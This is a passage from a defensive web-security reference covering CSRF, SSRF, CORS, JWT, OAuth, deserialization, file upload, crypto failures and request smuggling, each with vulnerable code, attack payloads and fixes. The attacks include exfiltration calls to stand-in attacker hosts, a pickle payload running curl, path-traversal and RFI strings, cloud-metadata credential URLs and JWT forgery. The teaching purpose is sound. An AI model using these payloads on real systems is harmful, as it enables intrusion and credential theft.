This family is the *confused deputy*. A component with authority — the user's browser (which holds cookies), the server (which sits inside the network), or the user themselves (who can click) — is manipulated into exercising that authority on the attacker's behalf. The defence is always to bind the action to proof that the *right principal deliberately intended it*.

---

## 21. Cross-Site Request Forgery (CSRF)

**What it is:** A malicious site causes the victim's browser to send an authenticated, state-changing request to a site the victim is logged into, relying on the browser to attach the session cookie automatically.

**Mechanism:** Browsers attach cookies to requests based on their *destination*, not their *origin*. A form on `evil.com` that posts to `bank.com` still carries the victim's `bank.com` cookie. The server sees a valid session and acts.

### The attack

```html
<!-- Hosted on evil.com; auto-submits when the victim visits -->
<form action="https://bank.example.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('f').submit()</script>
```

### The fix

```
# Two independent layers:

1. SameSite cookies — the browser stops sending the cookie cross-site:
   Set-Cookie: session=...; SameSite=Lax; Secure; HttpOnly
   (Lax blocks cross-site POSTs; Strict blocks even top-level cross-site navigation.)

2. A CSRF token — a per-session random value the server issues and requires
   on every state-changing request, delivered in a header or hidden field.
   evil.com cannot read it (Same-Origin Policy), so it cannot forge the request.
```

```python
# Server-side check (constant-time comparison)
if not hmac.compare_digest(request.form["csrf_token"], session["csrf_token"]):
    abort(403)
```

**The principle:** never let a cookie alone authorise a state-changing action. Require a proof the cross-site attacker cannot obtain — a token they cannot read, or `SameSite` that stops the cookie being sent at all. Also: use `POST` (not `GET`) for state changes, and validate `Origin`/`Referer` as a cheap extra signal.

### Notes

- **Login CSRF** forces the victim to log in as the *attacker*, so the victim's later activity is recorded in the attacker's account. Defend the login form with a token too.
- **JSON APIs** with a custom `Content-Type: application/json` get some protection because such requests trigger a CORS preflight the attacker's page cannot satisfy — but do not rely on this alone; combine with `SameSite`.

---

## 22. Server-Side Request Forgery (SSRF)

**What it is:** The application is tricked into making an HTTP (or other-protocol) request to an attacker-chosen destination — typically internal services the attacker cannot reach directly, such as cloud metadata endpoints.

**Mechanism:** The server sits inside a trusted network. Any feature that fetches a user-supplied URL (webhook, "import from URL", PDF/screenshot generator, image proxy, SSO metadata fetch) can be pointed at `localhost`, `169.254.169.254`, or internal hostnames, and the server makes the request *from inside the perimeter*.

### Vulnerable code

```python
# Fetch a user-supplied avatar URL
def import_avatar(url):
    return requests.get(url).content   # any URL, including internal ones
```

### The attack

```
url = http://169.254.169.254/latest/meta-data/iam/security-credentials/role
→ returns AWS credentials for the instance role (IMDSv1)

url = http://localhost:6379/  → probe/abuse internal Redis
url = http://internal-admin.corp/  → reach an internal-only panel
url = file:///etc/passwd  → local file read if file:// is allowed
url = http://[::ffff:169.254.169.254]  → IPv6/encoding bypass of naive blocklists
```

### The fix

```python
import socket, ipaddress
from urllib.parse import urlparse

BLOCKED = [ipaddress.ip_network(n) for n in
    ("127.0.0.0/8","10.0.0.0/8","172.16.0.0/12","192.168.0.0/16",
     "169.254.0.0/16","::1/128","fc00::/7")]

def safe_fetch(url):
    u = urlparse(url)
    if u.scheme not in ("https",):          # allowlist scheme
        raise ValueError("scheme")
    # Resolve the hostname and check EVERY resolved IP against the blocklist
    for info in socket.getaddrinfo(u.hostname, None):
        ip = ipaddress.ip_address(info[4][0])
        if any(ip in net for net in BLOCKED):
            raise ValueError("blocked address")
    return requests.get(url, allow_redirects=False, timeout=5).content
```

**The principle:** validate the *resolved IP*, not the string — an attacker controls DNS for their own hostname and can point it at a link-local address. Because a name can re-resolve between the check and the fetch (**DNS rebinding**), the durable controls are: block outbound egress from the app to internal ranges at the network layer; require **IMDSv2** (a token-gated metadata service that defeats simple SSRF); disable redirects; and allowlist destinations where possible rather than blocklisting.

---

## 23. CORS Misconfiguration

**What it is:** An overly permissive Cross-Origin Resource Sharing policy lets a malicious origin read authenticated responses from your API — turning the Same-Origin Policy off exactly where it matters.

**Mechanism:** CORS relaxes the Same-Origin Policy by telling the browser which foreign origins may *read* a response. If the server reflects the request's `Origin` into `Access-Control-Allow-Origin` and also sends `Access-Control-Allow-Credentials: true`, any site can make credentialed requests and read the results.

### Vulnerable code

```javascript
// Reflecting Origin with credentials — the classic mistake
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin);   // reflects ANY origin
  res.header('Access-Control-Allow-Credentials', 'true');
  next();
});
```

### The attack

```javascript
// On evil.com — reads the victim's authenticated API response
fetch('https://api.example.com/me', { credentials: 'include' })
  .then(r => r.json())
  .then(d => fetch('https://attacker/x', { method:'POST', body: JSON.stringify(d) }));
```

### The fix

```javascript
const ALLOWED = new Set(['https://app.example.com']);
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED.has(origin)) {
    res.header('Access-Control-Allow-Origin', origin);   // echo only allowlisted
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Vary', 'Origin');                        // correct caching
  }
  next();
});
```

**The principle:** never reflect an arbitrary `Origin` with credentials enabled, and never use `Access-Control-Allow-Origin: *` with credentials (browsers block that combination, but people work around it wrongly). Maintain an explicit allowlist. Remember CORS controls who may *read* the response — it is not a substitute for CSRF protection, which controls who may *send* the request.

---

## 24. Clickjacking

**What it is:** The attacker loads your site in an invisible `<iframe>` over their own page, tricking the victim into clicking your buttons (transfer money, change settings, approve an OAuth grant) while believing they are clicking something on the attacker's page.

**Mechanism:** By default a page can be framed by any other page. With `opacity:0` and careful positioning, the attacker overlays your real, functioning UI beneath decoy content and captures the victim's clicks (UI redressing).

### The attack

```html
<style>iframe{opacity:0;position:absolute;top:0;left:0;width:100%;height:100%}</style>
<button>Click to win a prize!</button>
<iframe src="https://app.example.com/account/delete"></iframe>
<!-- The invisible "Confirm delete" button sits exactly under the decoy button. -->
```

### The fix

```
# Tell the browser your site may not be framed by other origins:
Content-Security-Policy: frame-ancestors 'self'
# Legacy header, still worth sending for old browsers:
X-Frame-Options: DENY
```

**The principle:** every sensitive, state-changing page must set `frame-ancestors` (the modern control) to prevent framing by foreign origins. For the highest-risk actions, also require an explicit confirmation step or re-authentication that a framed click cannot satisfy.

---

## 25. Cross-Site WebSocket Hijacking

**What it is:** CSRF against a WebSocket handshake. If a WebSocket connection is authenticated only by cookies and does not validate `Origin`, a malicious page can open a connection as the victim and exchange messages.

**Mechanism:** The WebSocket opening handshake is an HTTP request that carries cookies automatically, and it is *not* subject to the Same-Origin Policy in the way `fetch` is. If the server accepts the connection based on the cookie alone, `evil.com` can establish an authenticated socket.

### The attack

```javascript
// On evil.com
const ws = new WebSocket('wss://app.example.com/socket');   // victim's cookie attaches
ws.onmessage = e => fetch('https://attacker/x', {method:'POST', body:e.data});
ws.onopen = () => ws.send('{"action":"getAccountData"}');
```

### The fix

Validate the `Origin` header on the WebSocket handshake against an allowlist, and require a CSRF-style token in the handshake (e.g. as a query parameter or first message) that the cross-site attacker cannot obtain. Do not authenticate the socket by cookie alone.

---

## 26. postMessage Vulnerabilities

**What it is:** `window.postMessage` enables cross-origin communication between frames/windows. Two bugs: a *sender* that posts secrets with `targetOrigin: '*'`, and a *receiver* that acts on messages without checking `event.origin`.

### Vulnerable code

```javascript
// Receiver that trusts any sender — and feeds data to a dangerous sink
window.addEventListener('message', e => {
  document.getElementById('out').innerHTML = e.data;   // no origin check → DOM XSS
});

// Sender leaking a secret to any origin
otherWindow.postMessage(authToken, '*');   // '*' means "any origin may receive this"
```

### The fix

```javascript
window.addEventListener('message', e => {
  if (e.origin !== 'https://app.example.com') return;   // verify the sender
  document.getElementById('out').textContent = e.data;  // safe sink
});
otherWindow.postMessage(authToken, 'https://trusted.example.com');  // explicit target
```

**The principle:** always specify an explicit `targetOrigin` when sending, and always verify `event.origin` (and where relevant `event.source`) when receiving. Never route message data into a dangerous sink.

---

## 27. Reverse Tabnabbing

**What it is:** A link opened with `target="_blank"` gives the *new* page limited control over the *original* tab via `window.opener` — it can silently redirect your tab to a phishing page while the user is on the linked site.

### The attack

```html
<!-- On your site — a user-submitted link -->
<a href="https://attacker.com" target="_blank">Cool site</a>
```
```javascript
// attacker.com runs:
window.opener.location = 'https://app.example.com-phish.com/login';
// The user returns to find a convincing fake login for your site.
```

### The fix

```html
<a href="..." target="_blank" rel="noopener noreferrer">...</a>
```

**The principle:** add `rel="noopener"` to all `target="_blank"` links, especially user-supplied ones. Modern browsers default to `noopener` for `target="_blank"`, but set it explicitly and do not rely on the default for older browsers.

---

## 28. Open Redirect

**What it is:** The application redirects to a URL taken from user input without validating it, letting an attacker use *your* trusted domain to bounce victims to a phishing site — and, in OAuth, to steal tokens.

### Vulnerable code

```python
@app.route('/redirect')
def go():
    return redirect(request.args['next'])   # redirects anywhere
```

### The attack

```
https://app.example.com/redirect?next=https://evil.com/phish
# The victim sees the trusted app.example.com domain and trusts the link.

# In OAuth, an open redirect on a whitelisted redirect_uri path can leak
# the authorization code or token to the attacker (see §37).
```

### The fix

```python
from urllib.parse import urlparse
def safe_next(target):
    u = urlparse(target)
    # Allow only relative paths, or an explicit host allowlist
    if u.scheme or u.netloc:            # absolute URL → reject
        return "/"
    return target
```

**The principle:** never redirect to a raw user-supplied absolute URL. Allow only relative paths, or validate the host against an allowlist. For OAuth `redirect_uri`, require *exact* matching against registered values.

---

## 29. Prototype Pollution

**What it is:** A JavaScript-specific bug where an attacker sets properties on `Object.prototype`, affecting *every* object in the application — enabling denial of service, property injection, and sometimes RCE or XSS depending on how the polluted properties are later used.

**Mechanism:** Insecure recursive merge/clone/`set` functions that copy attacker keys like `__proto__`, `constructor`, or `prototype` into a target object end up writing to the shared prototype. Every object then appears to have the injected property.

### Vulnerable code

```javascript
// A naive deep-merge
function merge(target, src) {
  for (const k in src) {
    if (typeof src[k] === 'object') merge(target[k] = target[k] || {}, src[k]);
    else target[k] = src[k];
  }
}
merge({}, JSON.parse(userInput));   // userInput controls the keys
```

### The attack

```json
{ "__proto__": { "isAdmin": true } }
// After the merge, ({}).isAdmin === true for EVERY object.
// If the app later checks user.isAdmin without the user actually having it set,
// authorization is bypassed. Other gadgets lead to RCE (e.g. polluting
// child_process options) or XSS (polluting template config).
```

### The fix

```javascript
// 1. Reject dangerous keys.
const FORBIDDEN = new Set(['__proto__', 'constructor', 'prototype']);
// 2. Use Map for user-controlled key/value data.
// 3. Object.create(null) for prototype-less objects.
// 4. Object.freeze(Object.prototype) as a global backstop.
function safeMerge(target, src) {
  for (const k of Object.keys(src)) {
    if (FORBIDDEN.has(k)) continue;
    // ... recurse safely
  }
}
```

**The principle:** never copy untrusted keys into objects without filtering `__proto__`/`constructor`/`prototype`. Prefer `Map` for arbitrary key/value user data, use well-audited merge libraries (lodash ≥ patched versions), and consider freezing `Object.prototype`.

---
# Part D — Access Control & Authentication

This family is *missing or wrong authorization*, plus the attacks on the login and session machinery itself. Access control is the number-one category in the OWASP Top 10 (2021) because it cannot be delegated to a library: every endpoint must check, by hand, that *this* caller may act on *this* object. The frameworks give you authentication for free and authorization almost never.

---

## 30. Broken Access Control & IDOR

**What it is:** The application verifies *who you are* but not *whether you may access the specific resource you requested*. Insecure Direct Object Reference (IDOR) is the common form: an object identifier in the request can be changed to reference someone else's object.

**Mechanism:** The endpoint trusts an identifier from the request (URL path, query, body, header) and fetches that object without checking ownership.

### Vulnerable code

```python
@app.get('/api/invoices/<invoice_id>')
@require_login                          # checks authentication only
def get_invoice(invoice_id):
    return db.invoices.find_one({"_id": invoice_id})   # no ownership check
```

### The attack

```
# Alice is logged in and views her invoice:
GET /api/invoices/1001    → her invoice

# She changes the ID:
GET /api/invoices/1002    → Bob's invoice, returned in full
# Enumerate 1..N to scrape every invoice in the system.
```

### The fix

```python
@app.get('/api/invoices/<invoice_id>')
@require_login
def get_invoice(invoice_id):
    inv = db.invoices.find_one({"_id": invoice_id, "owner_id": current_user.id})
    if inv is None:
        abort(404)          # 404, not 403 — do not confirm the object exists
    return inv
```

**The principle:** every object access must be scoped to the caller's authority. The cleanest pattern is to *include the ownership constraint in the query itself* (`WHERE owner_id = ?`) so there is no window between fetch and check. Use unguessable identifiers (UUIDs) as defence in depth, but never rely on unguessability as the control — it is not access control.

### Variants of broken access control

| Variant | Description |
|---|---|
| **Horizontal IDOR** | Access another user's data at the same privilege level (Alice → Bob) |
| **Vertical escalation** | Access higher-privilege functionality (user → admin endpoints) |
| **Function-level** | `/admin/*` endpoints protected only by hiding the link, not by a check |
| **Forced browsing** | Guessing unlinked URLs (`/admin`, `/backup.zip`, `/.git/`) |
| **Metadata manipulation** | Tampering with a JWT claim, a hidden field, or a cookie that encodes role |
| **CORS-enabled** | Overly permissive CORS lets another origin read protected data (§23) |

**Detection:** log the *requested object id* alongside the *authenticated user id* on every request, then alert when one user accesses many distinct object ids in a short window. IDOR is nearly invisible in code review at scale and glaring in logs.

---

## 31. Path Traversal / LFI / RFI

**What it is:** User input used to build a file path lets an attacker escape the intended directory with `../` sequences and read (or write) arbitrary files. Local File Inclusion (LFI) executes an included local file; Remote File Inclusion (RFI) includes an attacker-hosted file.

### Vulnerable code

```python
@app.get('/download')
def download():
    filename = request.args['file']
    return send_file(f"/var/app/files/{filename}")   # filename may contain ../
```

### The attack

```
?file=../../../../etc/passwd            → reads /etc/passwd
?file=..%2f..%2f..%2fetc%2fpasswd       → URL-encoded bypass of naive filters
?file=....//....//etc/passwd            → "....//" survives a single ".." strip
?file=/etc/passwd                       → absolute path if not constrained

# PHP LFI → RCE via log poisoning or php://filter, or RFI:
?page=http://attacker.com/shell.txt     → RFI executes remote code (if allow_url_include)
```

### The fix

```python
import os
BASE = "/var/app/files"
@app.get('/download')
def download():
    filename = request.args['file']
    # Resolve to an absolute path and confirm it stays within BASE
    full = os.path.realpath(os.path.join(BASE, filename))
    if not full.startswith(BASE + os.sep):
        abort(403)
    return send_file(full)
```

**The principle:** canonicalise the resolved path (`realpath`, which collapses `../` and follows symlinks) and verify it is still inside the intended base directory. Better still, never pass user input as a path at all — map an opaque id to a filename in a lookup table. Decode input exactly once before validating, so encoded traversal is caught. For inclusion, never build an `include`/`require` path from user input, and disable `allow_url_include`.

---

## 32. Privilege Escalation

**What it is:** A user gains capabilities beyond their assigned role — *horizontal* (another user's data, §30) or *vertical* (administrative functions).

**Mechanism:** Common roots are trusting a client-supplied role, missing checks on admin endpoints, and parameter tampering.

### The attack

```
# Role in a client-controlled place
POST /api/profile   { "email": "x@y.com", "role": "admin" }   # mass assignment (§33)

# Admin endpoint protected only by an absent UI link
GET /admin/users    → returns the admin panel to any authenticated user

# Tampering with a role encoded in a cookie/JWT the client can edit
Cookie: role=admin   (unsigned)
JWT with alg=none    (see §36)
```

### The fix / principle

Derive privilege *server-side* from the authenticated identity, never from a request field. Protect every administrative route with an explicit role check in middleware (deny by default), not by hiding links. Sign and verify anything that encodes a role. Re-check authorization on every request — a role can be revoked mid-session, so a cached "is admin" decision must be short-lived or re-validated.

---

## 33. Mass Assignment (Auto-Binding)

**What it is:** A framework that automatically binds request fields to object properties lets an attacker set fields they should not control — `isAdmin`, `balance`, `verified`, `owner_id`.

**Mechanism:** ORMs and frameworks offer convenience methods (`User(**request.json)`, `Model.update(params)`) that map every incoming key to a model attribute. If the model has sensitive attributes and the input is not filtered, the attacker sets them.

### Vulnerable code

```python
# Rails/Django/Node pattern — bind the whole request body to the model
@app.post('/api/users/<id>')
def update_user(id):
    user = User.get(id)
    user.update(**request.json)     # request.json may include {"role": "admin"}
    user.save()
```

### The attack

```json
PUT /api/users/me
{ "displayName": "Alice", "role": "admin", "email_verified": true, "credits": 999999 }
# All of these are written because the model has these attributes and nothing filters them.
```

### The fix

```python
# Allowlist the fields a user may set. Never bind the whole body.
ALLOWED = {"displayName", "avatarUrl", "bio"}
updates = {k: v for k, v in request.json.items() if k in ALLOWED}
user.update(**updates)
```

**The principle:** explicitly allowlist bindable fields per endpoint (Rails `strong_parameters`, DRF serializer `fields`, DTOs with only the safe fields). Never auto-bind the raw request to a domain model. Sensitive attributes (role, ownership, balance, verification flags) must only be settable through dedicated, authorised code paths.

---

## 34. Authentication Weaknesses

**What it is:** A family of flaws in *proving identity* — weak passwords, no rate limiting, credential stuffing, password spraying, user enumeration, and insecure credential storage.

### The attacks

| Attack | How it works | Defence |
|---|---|---|
| **Brute force** | Try many passwords for one account | Rate limit + account lockout with backoff + CAPTCHA |
| **Credential stuffing** | Replay email:password pairs from other breaches | Rate limit **per account**, breach-password checks, MFA, device fingerprinting |
| **Password spraying** | Try one common password across many accounts | Global failure-rate alerting; per-password-across-accounts detection |
| **User enumeration** | Different responses/timing for valid vs invalid usernames | Identical response and timing for both cases |
| **Weak hashing** | Fast/unsalted hashes cracked offline after a DB breach | Argon2id / bcrypt / scrypt with per-user salt |

### Vulnerable vs fixed — password storage

```python
# VULNERABLE — fast, unsalted; a GPU cracks millions/sec after a breach
password_hash = hashlib.sha256(password.encode()).hexdigest()

# VULNERABLE — bcrypt silently truncates at 72 bytes
# (so "long-passphrase..." and its 72-byte prefix collide)

# FIXED — Argon2id: memory-hard, per-user salt embedded in the PHC string
from argon2 import PasswordHasher
ph = PasswordHasher(memory_cost=65536, time_cost=3, parallelism=4)
password_hash = ph.hash(password)          # store this
ph.verify(password_hash, password)         # verify later
```

### Key principles

- **Hash with a slow, memory-hard KDF** (Argon2id preferred; bcrypt/scrypt acceptable), with a unique salt per password (the KDF handles this).
- **Rate limit by account, not only by IP** — a botnet defeats per-IP limits by using one IP per attempt.
- **Constant-time, identical responses** for "no such user" and "wrong password," including matching the timing (run a dummy hash on the miss path) so timing does not leak account existence.
- **Cap password length before hashing** (e.g. 1024 bytes) to prevent KDF denial of service; validate the token/format *before* running the expensive hash.
- **Offer and encourage MFA**, and check submitted passwords against known-breached lists (per NIST SP 800-63B, which recommends against forced complexity and rotation).

---

## 35. Session Attacks

**What it is:** Attacks on the session identifier that represents an authenticated user: fixation, hijacking, and prediction.

| Attack | Mechanism | Defence |
|---|---|---|
| **Fixation** | Attacker plants a known session id; server reuses it after login | **Rotate the session id on every authentication** |
| **Hijacking** | Attacker steals the id (XSS, sniffing, logs) and replays it | `HttpOnly` + `Secure` + `SameSite`; short TTL; bind to signals |
| **Prediction** | Low-entropy ids are guessable | 128–256 bits of CSPRNG output |
| **Cookie tossing** | A sibling subdomain sets a cookie for the parent domain | `__Host-` cookie prefix; scope to exact host |

### The essential cookie configuration

```
Set-Cookie: __Host-session=<256-bit CSPRNG>;
            Path=/; Secure; HttpOnly; SameSite=Lax
```

- `HttpOnly` — JavaScript cannot read it, blocking XSS *theft* (not XSS *use*).
- `Secure` — never sent over plaintext HTTP.
- `SameSite=Lax` — not sent on cross-site POSTs, the core CSRF defence.
- `__Host-` prefix — the browser refuses the cookie unless it is `Secure`, `Path=/`, and has *no* `Domain` attribute, which structurally prevents cookie tossing from sibling subdomains.

**The principles:** generate session ids from a CSPRNG (256 bits), rotate on login and on privilege change, store session *state* server-side (never in a client-editable cookie), enforce both absolute and idle timeouts, and delete the session on logout so revocation is immediate. (See the dedicated session-auth breakdown in `system breakdowns/Authentication Systems/` for the full lifecycle.)

---

## 36. JWT Attacks

**What it is:** Attacks on JSON Web Tokens — forging tokens by exploiting weak or misconfigured signature verification.

### The attacks

**`alg: none`** — the token claims no algorithm; a permissive library skips signature verification and trusts the payload.

```
header:  {"alg":"none","typ":"JWT"}
payload: {"sub":"admin","role":"admin","exp":9999999999}
token:   base64(header).base64(payload).       ← empty signature
```

**RS256 → HS256 confusion** — the server verifies with a public key, but the attacker changes `alg` to HS256 and signs using the *public key bytes as the HMAC secret*. A library that picks the algorithm from the header verifies it successfully.

```python
# The public key is public. The attacker signs an HS256 token with it:
forged = jwt.encode(payload, public_key_pem, algorithm="HS256")
# A server doing jwt.decode(token, public_key) with no algorithm pin accepts it.
```

**Weak HS256 secret** — if the shared secret is a guessable string, it is crackable offline from one captured token (`hashcat -m 16500`), after which the attacker forges any token.

**Other issues:** unverified `kid` header used to load a key (path traversal / SQL injection into key lookup), missing `exp` check, missing `aud`/`iss` validation (a token for service A accepted by service B), and putting sensitive data in the (base64, *not encrypted*) payload.

### The fix

```python
# Pin the algorithm explicitly; validate all standard claims.
claims = jwt.decode(
    token, public_key,
    algorithms=["RS256"],                 # an ALLOWLIST — the header cannot change it
    audience="api.example.com",
    issuer="https://auth.example.com",
    options={"require": ["exp", "iat", "aud", "iss"]},
)
```

**The principle:** always pass an explicit algorithm allowlist to the verifier — never let the token's own header choose how it is verified. Use asymmetric signing (RS256/ES256) so resource servers hold only the public key. Validate `exp`, `aud`, and `iss`. Keep secrets long and random. Remember JWT payloads are *signed, not encrypted* — never put secrets in them.

---

## 37. OAuth / OIDC Attacks

**What it is:** Attacks on delegated-authorization flows — stealing authorization codes or tokens, or linking the victim's session to the attacker's account.

### The attacks

- **`redirect_uri` manipulation** — if the authorization server allows loose matching (prefix, wildcard, or an open redirect on a registered path), the attacker redirects the authorization code to themselves. *Fix: exact `redirect_uri` matching.*
- **Missing `state`** — without a `state` parameter bound to the user's session, an attacker can perform login CSRF, grafting the victim's browser onto the attacker's account. *Fix: a CSPRNG `state`, validated on callback.*
- **Authorization code interception** — a code stolen in transit (logs, referrer) is exchanged by the attacker. *Fix: PKCE — the code cannot be exchanged without the per-flow `code_verifier`.*
- **Missing `nonce`** — an OIDC `id_token` can be replayed. *Fix: bind and validate a `nonce`.*
- **Token leakage via implicit flow** — tokens in the URL fragment leak to history/referrer. *Fix: use the authorization-code flow with PKCE; the implicit flow is deprecated.*
- **Mix-up / confused deputy** — a client that accepts tokens without checking `aud`/issuer can be tricked. *Fix: validate `iss` and `aud`.*

### Key principles

Exact `redirect_uri` matching, mandatory PKCE, a validated `state` for CSRF and a `nonce` for replay, the authorization-code flow (never implicit), and strict `aud`/`iss` validation on every token. (The full flow with worked attacks is in `system breakdowns/Authentication Systems/Google OAuth Login System`.)

---
# Part E — Data, Files & Cryptography

---

## 38. Insecure Deserialization

**What it is:** Untrusted data is deserialized into live objects by a format that can instantiate arbitrary types or run code during deserialization — leading to remote code execution.

**Mechanism:** Some serialization formats restore not just data but *behaviour*. Python `pickle`, Java `ObjectInputStream`, Ruby `Marshal`, PHP `unserialize`, and .NET `BinaryFormatter` can construct objects whose constructors, magic methods, or `readObject` hooks execute code. An attacker crafts a byte stream — a "gadget chain" — that, when deserialized, invokes existing methods to reach a dangerous operation.

### Vulnerable code

```python
import pickle, base64
# Deserializing a cookie/token supplied by the client
def load_prefs(cookie_value):
    return pickle.loads(base64.b64decode(cookie_value))   # arbitrary code execution
```

### The attack

```python
# The attacker crafts a pickle whose __reduce__ runs a command on load
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ("curl http://attacker/$(whoami)",))
payload = base64.b64encode(pickle.dumps(Exploit()))
# Send `payload` as the cookie. pickle.loads() executes os.system() during load.
```

Java equivalents use libraries on the classpath (Commons-Collections, Spring) as gadget chains — the `ysoserial` tool generates them. .NET `BinaryFormatter` and `TypeNameHandling.All` in Json.NET are the classic sinks.

### The fix

```python
import json
# Use a data-only format that cannot instantiate arbitrary types or run code.
def load_prefs(cookie_value):
    data = json.loads(cookie_value)        # produces only dicts/lists/strings/numbers
    # then validate against a schema before use
    return prefs_schema.validate(data)
```

**The principle:** never deserialize untrusted data with a format that can execute code or instantiate arbitrary types. Use data-only formats (JSON, with schema validation) for anything crossing a trust boundary. If a rich format is unavoidable, sign the serialized blob (HMAC) so only server-produced data is ever deserialized, and use allowlist-based type filtering (Java `ObjectInputFilter`). Never use `pickle`, `Marshal`, `BinaryFormatter`, or `TypeNameHandling.All` on client input.

---

## 39. File Upload Vulnerabilities

**What it is:** An upload feature that fails to constrain file type, content, name, or storage location — leading to web-shell execution, stored XSS, SSRF, or denial of service.

### The attacks

```
# 1. Web shell — upload shell.php to a directory the server executes
POST /upload  →  saves shell.php  →  GET /uploads/shell.php?cmd=id  → RCE

# 2. Double extension / content-type mismatch
shell.php.jpg        (server executes by first extension)
shell.jpg  with PHP in EXIF + a .htaccess making .jpg executable

# 3. SVG upload → stored XSS (SVG is XML and can contain <script>)
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>

# 4. Path traversal in the filename → overwrite arbitrary files
filename="../../var/www/html/index.php"

# 5. Zip/decompression bomb → disk/memory exhaustion (DoS)
# 6. XXE via uploaded DOCX/XLSX/SVG parsed server-side
# 7. Pixel-flood image → image processor OOM
```

### The fix

```python
import os, uuid, magic   # python-magic sniffs real content type

ALLOWED = {"image/jpeg": ".jpg", "image/png": ".png"}
MAX_BYTES = 5 * 1024 * 1024

def save_upload(file):
    data = file.read(MAX_BYTES + 1)
    if len(data) > MAX_BYTES:
        abort(413)
    mime = magic.from_buffer(data, mime=True)      # detect by CONTENT, not name
    if mime not in ALLOWED:
        abort(415)
    # Generate our own name and extension — never trust the client's filename
    name = f"{uuid.uuid4().hex}{ALLOWED[mime]}"
    # Store OUTSIDE the web root / on object storage; serve via a handler, not directly
    path = os.path.join("/srv/uploads", name)      # not under the executable web root
    with open(path, "wb") as f:
        f.write(data)
    return name
```

**The principles:**
- **Validate content, not the extension or client `Content-Type`** (both are attacker-controlled) — sniff the real type, and for images, re-encode them (which strips embedded payloads and confirms they are real images).
- **Generate your own filename and extension**; never use the client's.
- **Store outside the web root** (ideally in object storage) and serve through a handler that sets `Content-Type` and `Content-Disposition: attachment` — so uploaded files are never executed and never rendered inline as HTML/SVG.
- **Cap size and decompression ratio**; scan with anti-malware where relevant.
- **Disable execution** in the upload directory (no PHP handler, `X-Content-Type-Options: nosniff`).

---

## 40. Sensitive Data Exposure

**What it is:** Confidential data is exposed through weak transport, careless storage, verbose responses, or leaky logs — not through a single dramatic exploit but through accumulated small failures.

### Common exposures

| Exposure | Example | Fix |
|---|---|---|
| Plaintext transport | Login over HTTP; mixed content | HTTPS everywhere + HSTS preload |
| Secrets in code/repos | API keys committed to git | Secrets manager; scan history; rotate |
| Verbose errors | Stack traces revealing paths, versions, queries | Generic errors in production |
| Over-broad API responses | Returning the whole user row incl. `password_hash`, PII | Allowlist response fields (DTOs) |
| Data in URLs | Tokens/IDs in query strings → logs, referrer, history | Use POST bodies / headers |
| Logged secrets | Tokens, passwords, PANs written to logs | Redact; never log credentials |
| Directory listing / backup files | `/.git/`, `/backup.sql`, `.env` served | Block dotfiles; keep artifacts out of web root |
| Missing cache headers | Private data cached by CDN/proxy | `Cache-Control: private, no-store`; `Vary` |

### The `.git` exposure — a concrete, common one

```
GET https://app.example.com/.git/HEAD
→ "ref: refs/heads/main"    # the .git directory is served

# Tools reconstruct the FULL source history from /.git/objects,
# including credentials removed in later commits (git-dumper).
```

**Fix:** block dot-directories at the web server, deploy build artifacts rather than working trees, keep `.git` outside the document root.

**The principle:** classify data, encrypt it in transit (TLS 1.2+) and at rest, minimise what you return and log, and construct API responses from explicit field allowlists so a new sensitive column is *absent by default* rather than leaked the day it is added.

---

## 41. Cryptographic Failures

**What it is:** Using cryptography incorrectly — weak algorithms, misused modes, predictable randomness, or broken protocols — so that "encrypted" or "hashed" data is recoverable or forgeable.

### The failures

```
# Weak password hashing — fast, GPU-friendly, or unsalted
MD5 / SHA-1 / unsalted SHA-256   → crack after a breach
FIX: Argon2id / bcrypt / scrypt (see §34)

# ECB mode — identical plaintext blocks produce identical ciphertext blocks
AES-ECB reveals patterns (the famous "ECB penguin")
FIX: AES-GCM (authenticated) or AES-CBC with random IV + separate MAC

# IV/nonce reuse — reusing a nonce in GCM/CTR is catastrophic
Reusing a GCM nonce with the same key leaks the auth key and plaintext XOR
FIX: a fresh random (or counter) nonce per encryption; never reuse

# Predictable randomness — using a non-CSPRNG for tokens/keys
Math.random() / rand() → predictable session ids, reset tokens, keys
FIX: crypto.randomBytes / secrets / SecureRandom

# Padding oracle — CBC decryption errors distinguishable from padding errors
Attacker decrypts ciphertext byte-by-byte without the key (POODLE/BEAST era)
FIX: authenticated encryption (AES-GCM); constant-time, uniform error handling

# Hardcoded / reused keys, no key rotation, home-grown crypto
FIX: KMS/HSM-managed keys, rotation, vetted libraries — never roll your own
```

### Worked example — encryption done right

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

key = AESGCM.generate_key(bit_length=256)     # store in KMS, not in code
aesgcm = AESGCM(key)

def encrypt(plaintext: bytes, aad: bytes = b"") -> bytes:
    nonce = os.urandom(12)                     # FRESH random nonce every time
    ct = aesgcm.encrypt(nonce, plaintext, aad) # authenticated: tampering is detected
    return nonce + ct                          # prepend nonce for decryption

def decrypt(blob: bytes, aad: bytes = b"") -> bytes:
    nonce, ct = blob[:12], blob[12:]
    return aesgcm.decrypt(nonce, ct, aad)      # raises on any tampering
```

**The principles:** use authenticated encryption (AES-GCM, ChaCha20-Poly1305) so tampering is detected; use a CSPRNG for every secret value; never reuse a nonce with the same key; hash passwords with a memory-hard KDF; manage keys in a KMS/HSM with rotation; and never invent your own algorithm or protocol — use vetted, high-level libraries (libsodium, `cryptography`) that make the safe choice the default.

---

# Part F — Infrastructure & Protocol Attacks

These exploit the layers *between* the client and the application logic — proxies, caches, DNS, connection handling — and often affect many users at once.

---

## 42. HTTP Request Smuggling

**What it is:** A front-end proxy and a back-end server disagree about where one HTTP request ends and the next begins, letting an attacker "smuggle" a partial request that prepends to the *next* user's request.

**Mechanism:** A request's body length can be declared two ways: `Content-Length` and `Transfer-Encoding: chunked`. If a front-end honours one and the back-end honours the other (CL.TE, TE.CL, TE.TE), the attacker crafts a request where the two servers disagree on its boundary. The leftover bytes are interpreted by the back-end as the start of the *next* connection's request — which may belong to another user.

### The attack (CL.TE shape)

```
POST / HTTP/1.1
Host: app.example.com
Content-Length: 6
Transfer-Encoding: chunked

0

GPOST /admin ...      ← the front-end thinks the body is "0\r\n\r\nG",
                         the back-end (using TE) thinks the request ended at "0",
                         and treats "GPOST /admin..." as a new request prefixed
